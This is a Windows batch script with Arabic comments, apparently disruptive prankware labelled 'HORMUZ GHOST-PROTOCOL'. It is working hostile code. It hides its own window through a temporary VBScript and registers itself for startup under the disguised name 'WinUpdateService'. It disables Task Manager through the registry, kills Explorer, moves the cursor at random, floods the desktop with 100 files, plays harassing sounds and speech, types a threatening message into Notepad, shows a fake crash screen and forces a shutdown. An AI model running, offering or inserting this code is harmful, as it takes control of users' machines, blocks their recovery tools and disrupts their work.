@echo off
:: [STAGE 0: ELEVATION & STEALTH]
:: طلب صلاحيات الأدمن وإخفاء النافذة تماماً باستخدام VBScript داخلي
if not "%1"=="p" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\h.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " p", 0 >> "%temp%\h.vbs"
    wscript "%temp%\h.vbs" & del "%temp%\h.vbs" & exit /b
)

:: [STAGE 1: SYSTEM OVERRIDE]
:: تعطيل الحماية واحتلال السجل (Registry)
chcp 65001 >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdateService" /t REG_SZ /d "%~f0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1

:: [STAGE 2: THE ETERNAL SYMPHONY & VOICES]
:: تشغيل المعزوفة والتحولات الصوتية في عملية منفصلة خلفية
start /b powershell -Command "& {
    $s = New-Object -ComObject SAPI.SpVoice;
    $s.Volume = 100;
    
    # 1. المعزوفة (The Lonely Shepherd)
    [console]::beep(783, 600); [console]::beep(880, 600); [console]::beep(932, 1200);
    
    # 2. التحول للصراخ (The Scream)
    for ($i=1000; $i -le 7000; $i+=200) { [console]::beep($i, 50) };
    
    # 3. الضحك الرقمي (Digital Laugh)
    for ($i=1; $i -le 5; $i++) { [console]::beep(600, 100); [console]::beep(1000, 100) };
    
    # 4. الـ 100 سؤال بنبرات متغيرة (100 Questions)
    for ($i=1; $i -le 100; $i++) {
        $s.Rate = (Get-Random -Min -10 -Max 10);
        $s.Speak('لماذا لا تضحك معي؟');
    }
}"

:: [STAGE 3: THE 100-FEATURE CHAOS ENGINE]
:: تنفيذ الميزات الـ 100 في حلقة صامتة
powershell -Command "Stop-Process -Name explorer -Force; for ($i=1; $i -le 100; $i++) { 
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    $path = [Environment]::GetFolderPath('Desktop') + '\Star_Ancient_' + $i + '.txt';
    '𓅓𓅱𓏏 ستاره تو خاموش شد ⭐' | Out-File $path;
}"

:: [STAGE 4: THE PHANTOM MESSAGE]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'النجمة ⭐ استدعت الـ 100 لعنة.. استمتع بالصراخ والضحك.. نراك في مضيق هرمز.'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Sleep -m 50}"

:: [STAGE 5: FINAL COLLAPSE]
:: شاشة الموت الحمراء وانهيار النظام
color 4f
cls
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  HORMUZ GHOST-PROTOCOL: v100.0 PRO ACTIVE       !
echo !  STATUS: ALL SOULS ARCHIVED                     !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

timeout /t 10 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. الضحكة الأخيرة للنجمة."
